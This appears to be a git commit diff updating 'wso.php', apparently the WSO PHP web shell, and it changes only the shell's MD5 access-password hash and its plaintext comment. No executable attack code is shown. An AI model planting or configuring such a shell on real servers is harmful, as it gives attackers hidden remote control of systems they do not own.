c5aec121f0603c74e3193c79f0ae4c68ec45d1a3
herasec <148693984+herasec7@users.noreply.github.com>
2023-11-04 20:25:40 +0700

    Update wso.php

--- wso.php
+++ wso.php
@@ -1,7 +1,7 @@
 <?php 
 session_start();
 error_reporting(0);
-$password = "015e21d9b882f2656679a2128b1a5975"; // gobloklo
+$password = "01a2f4c84901fd62e8845107993bb5f7"; // goblok
 $passtype = "MD5";
 $color = "#df5";
 $default_action = 'FilesMan';
